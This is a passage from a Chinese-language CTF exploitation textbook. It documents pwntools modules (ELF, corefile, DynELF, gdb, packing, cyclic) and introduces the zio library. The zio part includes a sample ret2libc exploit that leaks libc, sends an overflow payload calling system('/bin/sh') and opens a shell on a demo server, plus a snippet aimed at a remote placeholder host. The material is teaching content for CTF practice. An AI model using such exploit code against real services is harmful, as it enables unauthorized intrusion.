Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
>>> print hex(e.address)
0x400000
>>> print hex(e.symbols['write'])
0x401680
>>> print hex(e.got['write'])
0x60b070
>>> print hex(e.plt['write'])
0x401680
上面的代码分别获得了 ELF 文件装载的基地址、函数地址、GOT 表地址和 PLT 表
地址。
我们常常用它打开一个 libc.so，从而得到 system 函数的位置，这在 CTF 中是非常
有用的：
>>> e = ELF('/usr/lib/libc.so.6')
[*] '/usr/lib/libc.so.6'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
>>> print hex(e.symbols['system'])
0x42010
我们甚至可以修改 ELF 文件的代码：
294
2.4.1 pwntools
>>> e = ELF('/bin/cat')
>>> e.read(e.address+1, 3)
'ELF'
>>> e.asm(e.address, 'ret')
>>> e.save('/tmp/quiet-cat')
>>> disasm(file('/tmp/quiet-cat','rb').read(1))
' 0: c3 ret'
下面是一些常用函数：
asm(address, assembly) ：汇编指定指令并插入到 ELF 的指定地址处，需
要使用 ELF.save() 保存
bss(offset) ：返回 .bss 段加上 offset 后的地址
checksec() ：打印出文件使用的安全保护
disable_nx() ：关闭 NX
disasm(address, n_bytes) ：返回对指定虚拟地址进行反汇编后的字符串
offset_to_vaddr(offset) ：将指定偏移转换为虚拟地址
vaddr_to_offset(address) ：将指定虚拟地址转换为文件偏移
read(address, count) ：从指定虚拟地址读取 count 个字节的数据
write(address, data) ：在指定虚拟地址处写入 data
section(name) ：获取 name 段的数据
debug() ：使用 gdb.debug() 进行调试
最后还要注意一下 pwnlib.elf.corefile ，它用于处理核心转储文件（Core
Dump），当我们在写利用代码时，核心转储文件是非常有用的，关于它更详细的
内容已经在前面 Linux基础一章中讲过，这里我们还是使用那一章中的示例代码，
但使用 pwntools 来操作。
295
2.4.1 pwntools
>>> core = Corefile('/tmp/core-a.out-30555-1507796886')
[x] Parsing corefile...
[*] '/tmp/core-a.out-30555-1507796886'
Arch: i386-32-little
EIP: 0x565cd57b
ESP: 0x4141413d
Exe: '/home/firmy/a.out' (0x565cd000)
Fault: 0x4141413d
[+] Parsing corefile...: Done
>>> core.registers
{'xds': 43, 'eip': 1448924539, 'xss': 43, 'esp': 1094795581, 'xg
s': 99, 'edi': 0, 'orig_eax': 4294967295, 'xcs': 35, 'eax': 1, '
ebp': 1094795585, 'xes': 43, 'eflags': 66182, 'edx': 4151195744,
'ebx': 1094795585, 'xfs': 0, 'esi': 4151189032, 'ecx': 10947955
85}
>>> print core.maps
565cd000-565ce000 r-xp 1000 /home/firmy/a.out
565ce000-565cf000 r--p 1000 /home/firmy/a.out
565cf000-565d0000 rw-p 1000 /home/firmy/a.out
57b3c000-57b5e000 rw-p 22000
f7510000-f76df000 r-xp 1cf000 /usr/lib32/libc-2.26.so
f76df000-f76e0000 ---p 1000 /usr/lib32/libc-2.26.so
f76e0000-f76e2000 r--p 2000 /usr/lib32/libc-2.26.so
f76e2000-f76e3000 rw-p 1000 /usr/lib32/libc-2.26.so
f76e3000-f76e6000 rw-p 3000
f7722000-f7724000 rw-p 2000
f7724000-f7726000 r--p 2000 [vvar]
f7726000-f7728000 r-xp 2000 [vdso]
f7728000-f774d000 r-xp 25000 /usr/lib32/ld-2.26.so
f774d000-f774e000 r--p 1000 /usr/lib32/ld-2.26.so
f774e000-f774f000 rw-p 1000 /usr/lib32/ld-2.26.so
ffe37000-ffe58000 rw-p 21000 [stack]
>>> print hex(core.fault_addr)
0x4141413d
>>> print hex(core.pc)
0x565cd57b
>>> print core.libc
f7510000-f76df000 r-xp 1cf000 /usr/lib32/libc-2.26.so
296
2.4.1 pwntools
dynelf
pwnlib.dynelf.DynELF
该模块是专门用来应对无 libc 情况下的漏洞利用。它首先找到 glibc 的基地址，然
后使用符号表和字符串表对所有符号进行解析，直到找到我们需要的函数的符号。
这是一个有趣的话题，我们会专门开一个章节去讲解它。详见 4.4 使用 DynELF 泄
露函数地址
fmtstr
pwnlib.fmtstr.FmtStr ， pwnlib.fmtstr.fmtstr_payload
该模块用于格式化字符串漏洞的利用，格式化字符串漏洞是 CTF 中一种常见的题
型，我们会在后面的章节中详细讲述，关于该模块的使用也会留到那儿。详见
3.3.1 格式化字符串漏洞
gdb
pwnlib.gdb
在写漏洞利用的时候，常常需要使用 gdb 动态调试，该模块就提供了这方面的支
持。
两个常用函数：
gdb.attach(target, gdbscript=None) ：在一个新终端打开 gdb 并
attach 到指定 PID 的进程，或是一个 pwnlib.tubes 对象。
gdb.debug(args, gdbscript=None) ：在新终端中使用 gdb 加载一个二进
制文件。
上面两种方法都可以在开启的时候传递一个脚本到 gdb，可以很方便地做一些操
作，如自动设置断点。
297
2.4.1 pwntools
# attach to pid 1234
gdb.attach(1234)
# attach to a process
bash = process('bash')
gdb.attach(bash, '''
set follow-fork-mode child
continue
''')
bash.sendline('whoami')
# Create a new process, and stop it at 'main'
io = gdb.debug('bash', '''
# Wait until we hit the main executable's entry point
break _start
continue
# Now set breakpoint on shared library routines
break malloc
break free
continue
''')
memleak
pwnlib.memleak
该模块用于内存泄露的利用。可用作装饰器。它会将泄露的内存缓存起来，在漏洞
利用过程中可能会用到。
rop
util
pwnlib.util.packing , pwnlib.util.cyclic
298
2.4.1 pwntools
util 其实是一些模块的集合，包含了一些实用的小工具。这里主要介绍两个，
packing 和 cyclic。
packing 模块用于将整数打包和解包，它简化了标准库中的 struct.pack 和
struct.unpack 函数，同时增加了对任意宽度整数的支持。
使用 p32 , p64 , u32 , u64 函数分别对 32 位和 64 位整数打包和解包，也可
以使用 pack() 自己定义长度，另外添加参数 endian 和 signed 设置端序
和是否带符号。
>>> p32(0xdeadbeef)
'\xef\xbe\xad\xde'
>>> p64(0xdeadbeef).encode('hex')
'efbeadde00000000'
>>> p32(0xdeadbeef, endian='big', sign='unsigned')
'\xde\xad\xbe\xef'
>>> u32('1234')
875770417
>>> u32('1234', endian='big', sign='signed')
825373492
>>> u32('\xef\xbe\xad\xde')
3735928559
cyclic 模块在缓冲区溢出中很有用，它帮助生成模式字符串，然后查找偏移，以确
定返回地址。
>>> cyclic(20)
'aaaabaaacaaadaaaeaaa'
>>> cyclic_find(0x61616162)
4
Pwntools 在 CTF 中的运用
可以在下面的仓库中找到大量使用 pwntools 的 write-up： pwntools-write-ups
299
2.4.1 pwntools
参考资料
docs.pwntools.com
300
2.4.2 zio
2.4.2 zio
zio 简介
安装
使用方法
zio 在 CTF 中的应用
zio 简介
zio 是一个易用的 Python io 库，在 Pwn 题目中被广泛使用，zio 的主要目标是在
stdin/stdout 和 TCP socket io 之间提供统一的接口，所以当你在本地完成 利用开
发后，使用 zio 可以很方便地将目标切换到远程服务器。
zio 的哲学：
from zio import *
if you_are_debugging_local_server_binary:
io = zio('./buggy-server') # used for local pwning
development
elif you_are_pwning_remote_server:
io = zio(('1.2.3.4', 1337)) # used to exploit remote
service
io.write(your_awesome_ropchain_or_shellcode)
# hey, we got an interactive shell!
io.interact()
官方示例：
301
2.4.2 zio
from zio import *
io = zio('./buggy-server')
# io = zio((pwn.server, 1337))
for i in xrange(1337):
io.writeline('add ' + str(i))
io.read_until('>>')
io.write("add TFpdp1gL4Qu4aVCHUF6AY5Gs7WKCoTYzPv49QSa\ninfo " +
"A" * 49 + "\nshow\n")
io.read_until('A' * 49)
libc_base = l32(io.read(4)) - 0x1a9960
libc_system = libc_base + 0x3ea70
libc_binsh = libc_base + 0x15fcbf
payload = 'A' * 64 + l32(libc_system) + 'JJJJ' + l32(libc_binsh)
io.write('info ' + payload + "\nshow\nexit\n")
io.read_until(">>")
# We've got a shell;-)
io.interact()
需要注意的的是，zio 正在逐步被开发更活跃，功能更完善的 pwntools 取代，但如
果你使用的是 32 位 Linux 系统，zio 可能是你唯一的选择。而且在线下赛中，内网
环境通常都没有 pwntools 环境，但 zio 是单个文件，上传到内网机器上就可以直接
使用。
安装
zio 仅支持 Linux 和 OSX，并基于 python 2.6, 2.7。
$ sudo pip2 install zio
termcolor 库是可选的，用于给输出上色： $ sudo pip2 install
termcolor 。
使用方法
302
2.4.2 zio
由于没有文档，我们通过读源码来学习吧，不到两千行，很轻量，这也意味着你可
以根据自己的需求很容易地进行修改。
总共导出了这些关键字：
__all__ = ['stdout', 'log', 'l8', 'b8', 'l16', 'b16', 'l32', 'b3
2', 'l64', 'b64', 'zio', 'EOF', 'TIMEOUT', 'SOCKET', 'PROCESS',
'REPR', 'EVAL', 'HEX', 'UNHEX', 'BIN', 'UNBIN', 'RAW', 'NONE', '
COLORED', 'PIPE', 'TTY', 'TTY_RAW', 'cmdline']
zio 对象的初始化定义：
def __init__(self, target, stdin = PIPE, stdout = TTY_RAW, print
_read = RAW, print_write = RAW, timeout = 8, cwd = None, env = N
one, sighup = signal.SIG_DFL, write_delay = 0.05, ignorecase = F
alse, debug = None):
通常可以这样：
io = zio(target, timeout=10000, print_read=COLORED(RAW,'red'), p
rint_write=COLORED(RAW,'green'))
内部函数很多，下面是常用的：
303
2.4.2 zio
def print_write(self, value):
def print_read(self, value):
def writeline(self, s = ''):
def write(self, s):
def read(self, size = None, timeout = -1):
def readlines(self, sizehint = -1):
def read_until(self, pattern_list, timeout = -1, searchwindowsiz
e = None):
def gdb_hint(self, breakpoints = None, relative = None, extras =
None):
def interact(self, escape_character=chr(29), input_filter = None
, output_filter = None, raw_rw = True):
zio 里的 read 和 write 对应到 pwntools 里就是 recv 和 send 。
另外是对字符的拆包解包，是对 struct 库的封装：
>>> l32(0xdeedbeaf)
'\xaf\xbe\xed\xde'
>>> l32('\xaf\xbe\xed\xde')
3740122799
>>> hex(l32('\xaf\xbe\xed\xde'))
'0xdeedbeaf'
>>> hex(b64('ABCDEFGH'))
'0x4142434445464748'
>>> b64(0x4142434445464748)
'ABCDEFGH'
l 和 b 就是指小端序和大端序。这些函数可以对应 pwntools 里的
p32() ， p64() 等。
当然你也可以直接在命令行下使用它：
304
2.4.2 zio
$ zio -h
usage:
$ zio [options] cmdline | host port
options:
-h, --help help page, you are reading this now!
-i, --stdin tty|pipe, specify tty or pipe stdin,
default to tty
-o, --stdout tty|pipe, specify tty or pipe stdout
, default to tty
-t, --timeout integer seconds, specify timeout
-r, --read how to print out content read from c